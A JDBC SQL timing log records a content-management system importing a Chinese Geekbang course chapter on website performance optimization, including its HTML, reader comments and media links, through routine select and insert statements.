data-key="508"> <span data-slate-object="text" data-key="509"><span data-slate-leaf="true" 
data-offset-key="509:0" data-first-offset="true"><span data-slate-string="true">应用进程、线程。</span></span></span> 
</div> </div> <div class="se-5ecc72a1 " data-slate-type="paragraph" data-slate-object="block" 
data-key="510"> <span data-slate-object="text" data-key="511"><span data-slate-leaf="true" 
data-offset-key="511:0" data-first-offset="true"><span data-slate-string="true">最后，欢迎你来分享你在性能优化中做测试和寻找性能瓶颈的故事，我相信这些经历，都会很有意思。</span></span></span> 
</div> <h2 class="se-671afc3a" data-slate-type="heading" data-slate-object="block" data-key="512"><span 
data-slate-object="text" data-key="513"><span data-slate-leaf="true" data-offset-key="513:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-859c7ee7" data-slate-type="list" data-slate-object="block" data-key="514"> <div class="se-8dfacf3f 
se-2551d7a2" data-slate-type="list-line" data-slate-object="block" data-key="515"> <span data-slate-object="text" 
data-key="516"><span data-slate-leaf="true" data-offset-key="516:0" data-first-offset="true"><span 
data-slate-string="true">关于性能指标，我提供两篇文章你可以做扩展，一篇是</span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="517" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" 
data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" data-first-offset="true"><span 
data-slate-string="true">美团性能优化之路——性能指标体系</span></span></span></a><span data-slate-object="text" 
data-key="519"><span data-slate-leaf="true" data-offset-key="519:0" data-first-offset="true"><span 
data-slate-string="true">，另一篇是</span></span></span><a data-slate-type="link" data-slate-object="inline" 
data-key="520" class="se-bd361ee3 se-f81bfce9"><span data-slate-object="text" data-key="521"><span 
data-slate-leaf="true" data-offset-key="521:0" data-first-offset="true"><span data-slate-string="true">性能测试中服务器关键性能指标浅析</span></span></span></a><span 
data-slate-object="text" data-key="522"><span data-slate-leaf="true" data-offset-key="522:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-8233582f se-9b8bfce0" data-slate-type="list-line" data-slate-object="block" data-key="523"> 
<span data-slate-object="text" data-key="524"><span data-slate-leaf="true" data-offset-key="524:0" 
data-first-offset="true"><span data-slate-string="true">第二篇也相关，来自阿里云性能测试 PTS 的官方文档，</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="525" class="se-bd361ee3 se-f81bfce9"><span 
data-slate-object="text" data-key="526"><span data-slate-leaf="true" data-offset-key="526:0" 
data-first-offset="true"><span data-slate-string="true">测试指标</span></span></span></a><span 
data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">，当然，对于文档中感兴趣的章节你也可以一并通读。</span></span></span> 
</div> </div> <div class="se-aa904147" data-slate-type="image" data-slate-object="block" data-key="528"> 
<img class="se-8132fb99" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 11, 11) 
 {executed in 1 msec}
2020-11-19 11:05:45.126 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=11 
 {executed in 0 msec}
2020-11-19 11:05:45.127 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:45.128 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=11 
 {executed in 1 msec}
2020-11-19 11:05:45.128 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:05:45.129 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605755145, 1605755145, 1, 'zh-hans', 0, 1, 1, 
0, '34丨网站性能优化（上）', 1, 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.133 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=11 
 {executed in 0 msec}
2020-11-19 11:05:45.134 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:05:45.135 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605755145, 1605755145, 1, 'zh-hans', 0, 
1, 1, 0, '34丨网站性能优化（上）', 'book', 1, 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.139 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=11 
 {executed in 1 msec}
2020-11-19 11:05:45.139 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.140 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=11 
 {executed in 1 msec}
2020-11-19 11:05:45.140 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.141 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/c64b829b94a5c666662faca8da5e2bb1?bkt=en-4d166c0718877615fbdc921cde5502252c01ec0723d603f79f946eda566013263a76f3b1c4c23dd2&fid=3757516097-778750-1114080025536479&time=1605755143&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-PPfaweCcAs89iu3utXXmUKm%2F1W0%3D&to=92&size=16068576&sta_dx=16068576&sta_cs=3077&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279287&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=16068576&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-33e5067bc346b08762f0d72fc95cbf5dd25e60fc41ab2dc3e11196fbaab755ad8cfd238149aa6a1d&sl=76480590&expires=8h&rt=pr&r=222809894&mlogid=7502004180118766207&vbdid=2247232042&fin=34%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8A%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7502004180118766207&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=34c17094e7d5a0c9672e09837fd3c6147b7a379e670253b9&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=34%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8A%EF%BC%89.m4a', 
11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.145 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.146 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:05:45.147 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', 'https://qdall01.baidupcs.com/file/c64b829b94a5c666662faca8da5e2bb1?bkt=en-4d166c0718877615fbdc921cde5502252c01ec0723d603f79f946eda566013263a76f3b1c4c23dd2&fid=3757516097-778750-1114080025536479&time=1605755143&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-PPfaweCcAs89iu3utXXmUKm%2F1W0%3D&to=92&size=16068576&sta_dx=16068576&sta_cs=3077&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1575279287&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=16068576&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-33e5067bc346b08762f0d72fc95cbf5dd25e60fc41ab2dc3e11196fbaab755ad8cfd238149aa6a1d&sl=76480590&expires=8h&rt=pr&r=222809894&mlogid=7502004180118766207&vbdid=2247232042&fin=34%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8A%EF%BC%89.m4a&bflag=92,34-92&rtype=1&dp-logid=7502004180118766207&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=34c17094e7d5a0c9672e09837fd3c6147b7a379e670253b9&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=34%E4%B8%A8%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%EF%BC%88%E4%B8%8A%EF%BC%89.m4a', 
11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.152 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.152 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.153 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.153 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.155 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-27 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 打卡：这块自己是自己的专长。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class="">1</span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/10/59/1d/88da559a.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>Mandalorian</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-28 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 好想实战 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> 
</div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 实战确实能够获得直接的知识，但是实战总是较为具体，不如这些更一般的经验和原则有普适性。因此我们二者都要学。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/12/f6/c3/926f2da9.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>Paradise丶朽木</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-27 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> “如果测试阶段还没有做到，那就只好等着上线以后，问题发生来打脸了。” <br>这个真的是印象深刻... 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 11, 11) 
 {executed in 1 msec}
2020-11-19 11:05:45.159 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.159 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:05:45.160 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-27 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 打卡：这块自己是自己的专长。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class="">1</span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/10/59/1d/88da559a.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>Mandalorian</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-28 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 好想实战 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> 
</div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 实战确实能够获得直接的知识，但是实战总是较为具体，不如这些更一般的经验和原则有普适性。因此我们二者都要学。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/12/f6/c3/926f2da9.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>Paradise丶朽木</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-11-27 </div> </div> <!----> 
</div> <div> <div class="_3M6kV3zb_0"> “如果测试阶段还没有做到，那就只好等着上线以后，问题发生来打脸了。” <br>这个真的是印象深刻... 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <!----> <div 
class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> 
</div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> 
</div> </div> </div></li>', 0, 'full_html', 'zh-hans', 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.165 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.165 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.166 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.166 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.167 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 11, 'https://static001.geekbang.org/resource/image/cc/e4/cce05e4958c0885b5b2f3dad1a4d90e4.jpg', 
11) 
 {executed in 0 msec}
2020-11-19 11:05:45.172 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=11 
 {executed in 0 msec}
2020-11-19 11:05:45.172 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:05:45.173 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 11, 'https://static001.geekbang.org/resource/image/cc/e4/cce05e4958c0885b5b2f3dad1a4d90e4.jpg', 
11) 
 {executed in 0 msec}
2020-11-19 11:05:45.179 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=11 
 {executed in 1 msec}
2020-11-19 11:05:45.179 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:45.180 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.185 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=11 
 {executed in 1 msec}
2020-11-19 11:05:45.185 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:05:45.186 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 11, 11) 
 {executed in 0 msec}
2020-11-19 11:05:45.190 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='1117935194302978' 
 {executed in 0 msec}
2020-11-19 11:05:45.190 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.191 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605755145, 1) 
 {executed in 0 msec}
2020-11-19 11:05:45.191 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605755145, 1) 
 {executed in 0 msec}
2020-11-19 11:05:45.192 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|12            |
|--------------|

2020-11-19 11:05:45.196 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '91967411-846a-4c84-9cc3-a8d7f6f3e3f3', 
12) 
 {executed in 0 msec}
2020-11-19 11:05:45.197 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '91967411-846a-4c84-9cc3-a8d7f6f3e3f3', 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.197 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|12            |
|--------------|

2020-11-19 11:05:45.202 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=12, revision_default=1, revision_timestamp=1605755145, 
revision_uid=1 where vid=12 
 {executed in 0 msec}
2020-11-19 11:05:45.208 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.209 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:05:45.210 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '1117935194302978', 'zh-hans', 12, 12) 
 {executed in 0 msec}
2020-11-19 11:05:45.214 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=12 
 {executed in 0 msec}
2020-11-19 11:05:45.215 INFO  jdbc.resultsettable Line:610 - 
